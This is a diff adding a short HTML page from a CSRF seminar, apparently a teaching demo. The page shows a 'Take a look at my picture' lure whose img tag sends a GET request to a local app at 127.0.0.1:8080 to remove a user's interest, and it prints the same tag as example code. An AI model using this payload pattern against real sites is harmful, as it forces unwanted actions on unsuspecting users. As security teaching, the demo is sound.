@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <title>CSRF seminar - remove interest attack</title>
+    </head>
+
+    <body>
+        Take a look at my picture:<br />
+        <img src="http://127.0.0.1:8080/?p=interests&action=remove&id=7" alt="My image.jpg" />
+
+        <br />
+        <br />
+        <hr />
+        Code:<br />
+        <code>
+        &lt;img src="http://127.0.0.1:8080/?p=interests&amp;action=remove&amp;id=7" alt="My image.jpg" /&gt;
+        </code>
+    </body>
+</html>
